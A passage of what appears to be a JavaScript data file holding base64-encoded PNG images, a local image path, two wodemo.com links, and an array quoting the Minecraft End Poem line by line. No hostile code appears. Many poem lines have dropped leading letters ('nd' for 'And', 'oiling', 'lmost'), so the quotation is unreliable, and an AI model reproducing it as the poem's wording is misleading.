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";
iVBORw0KGC = "/tieba/Mzsui/Mzsui.png";
iVBORw0KGCC = "/tieba/Mzsui/";
iVBORw0KGWD = "https://izehamahz.wodemo.com/entry/407040";
iVBORw0KGGG = "https://izehamahz.wodemo.com/entry/407039";
iVBORw0KG = "iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAO5klEQVR4nO1ae2wcRZr/dffMeHqenpdf41fsPG2yYDuBvUscUO6kXYTIQRJOupWCwsFGsEhIgBadxB/cSeh0/9xJx0p3gDgSWIGSTXLSRYS1WLgcbNgE4njjODbE8YzHr9gzY/e8p6dfVffH9Hi8sR2PnXGWP/KTSt1dXV1f1a+++uqrrwu4h3u4h3v4gWH79u3bT548eXJycnKSUkonJycnT548eXL79u3b/9xtWxfU1dXVnThx4oQgCEJPT0+PIAhCegkIgiC89tprr3Ecx5VLNlOuiu4Ex48fP75nz549pZY/evTo0ddff/31csj+QRBw6dKlSxaLxbKabw4dOnSor6+v705ll02V7gRbt27dWllZWZldBQwGg+Grr7766k5l/yA0wOv1et966623TCaTqdRvBEEQjhw5cuROZRvutILbobKysvLAgQMHWltbWwEgEAgETp8+fToej8cXlpvVYTAYSm4PIYQ8//zzz7e1tbUNDQ0NHT9+/Pit9ZaCddMAr9frffbZZ5/leZ5fmC+Kovj++++/H41GowvzX3nllVccDodjrfJCoVDo2LFjx1b73bppQGdnZ2dSx63vurq6unp6enoW5l29evXqpk2bNq1VXkVFRcVavls3AsxmszkSiUSWerdUY69cuXLF6XQ6S60/nU6nbTabrfB8q0aVinUj4HZzWtM0banyV69evVpbW1u7Ut3T09PT4+Pj45s2bdrkdrvdgiAIN27cuLGWdq6bDWhoaGiw2+32pd6lUqnUxMTExKLGMAzj8/l8Xq/Xu1y9s7Ozs9FoNEoppeVo57oRYDAYDB6Px8OyLLswnxBC5ubm5lRVVZf71mg0Gm02m81kMplYlmUJIUSWZTmdTqcVRVHK2c519QMYhmFMJpOp4LtrmqbJsiyXa/TuoQy4657g5s2bd/v9/rampqYHWJblqqurN/I876ysrKxxuVz+dDotRKPRUU3T5ImJiQEAmJiYGIhGo6PXrl37naqqcjnbs64EsCzLdXZ27tu5c+fB2traLU1NTQ94fT7OarPBbneAAuB5HixngMFkhNFogizLELNZaERDJp0GyzDIZbOQJQnC3CwC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";
var 终末之诗 = ["Once upon a time, there was a player.", "The player was you.", "Sometimes it thought itself human", "on the thin crust of a spinning globe of molten rock.", "The ball of molten rock circled a ball of blazing gas that was three hundred and thirty thousand times more massive than it", "They were so far apart that light took eight minutes to cross the gap. ", "The light was information from a star,", "nd it could burn your skin from a hundred and fifty million kilometres away.", "Sometimes the player dreamed it was a miner", "on the surface of a world that was flat, and infinite.", "The sun was a square of white.", "The days were short", "there was much to do", "nd death was a temporary inconvenience.", "Sometimes the player dreamed it was lost in a story.", "Sometimes the player dreamed it was other things", "in other places. Sometimes these dreams were disturbing.", "Sometimes very beautiful indeed.", "Sometimes the player woke from one dream into another", "then woke from that into a third.", "Sometimes the player dreamed it watched words on a screen.", "Let's go back.", "The atoms of the player were scattered in the grass", "in the rivers, in the air, in the ground", " woman gathered the atoms", "she drank and ate and inhaled and the woman assembled the player", "in her body.", "nd the player awoke", "from the warm, dark world of its mother's body", "into the long dream.", "nd the player was a new story", "never told before", "written in letters of DNA", "nd the player was a new program", "never run before", "generated by a sourcecode a billion years old", "nd the player was a new human", "never alive before made from nothing but milk and love.", "You are the player", "The story. The program.", "The human.", "Made from nothing but milk and love.", "Let's go further back.", "The seven billion billion billion atoms of the player's body were created", "long before this game", "in the heart of a star", "So the player, too.", "is information from a star", "nd the player moves through a story", "which is a forest of information planted by a man called Julian on a flat", "infinite world created by a man called Markus that exists inside a small", "private world created by the player, who inhabits a universe created by...", "Shush.", "Sometimes the player created a small", "private world that was soft and warm and simple.", "Sometimes hard, and cold, and complicated.", "Sometimes it built a model of the universe in its head", "flecks of energy, moving through vast empty spaces. ", "Sometimes it called those flecks \"electrons\" and \"protons\".", "Sometimes it called them \"planets\" and \"stars\".", "Sometimes it believed it was in a universe that was made of energy that was made of offs and ons;", "zeros and ones; lines of code", "Sometimes it believed it was playing a game", "Sometimes it believed it was reading words on a screen.", "You are the player, reading words...", "Shush...", "Sometimes the player read lines of code on a screen", "Decoded them into words;", "decoded words into meaning;", "decoded meaning into feelings, emotions, theories, ideas", "nd the player started to breathe faster and deeper and realised it was alive", "it was alive, those thousand deaths had not been real, the player was alive", "You. You. You are alive.", "nd sometimes the player believed the universe had spoken to it through the sunlight that came through the shuffling leaves of the summer trees", "nd sometimes the player believed the universe had spoken to it through the light that fell from the crisp night sky of winter, where a fleck of light in the corner of the player's eye might be a star a million times as massive as the sun", "oiling its planets to plasma in order to be visible for a moment to the player", "walking home at the far side of the universe", "suddenly smelling food", "lmost at the familiar door", "bout to dream again", "nd sometimes the player believed the universe had spoken to it through the zeros and ones", "through the electricity of the world", "through the scrolling words on a screen at the end of a dream", "nd the universe said I love you", "nd the universe said you have played the game well", "nd the universe said everything you need is within you", "nd the universe said you are stronger than you know", "nd the universe said you are the daylight", "nd the universe said you are the night", "nd the universe said the darkness you fight is within you", "nd the universe said the light you seek is within you", "nd the universe said you are not alone", "nd the universe said you are not separate from every other thing", "nd the universe said you are the universe tasting itself, talking to itself, reading its own code", "nd the universe said I love you because you are love.", "nd the game was over \"nd the player woke up from the dream.", "\"nd the player began a new dream.", "\"nd the player dreamed again, dreamed better. ", "\"nd the player was the universe. ", "\"nd the player was love.", "You are the player.", "Wake up."]
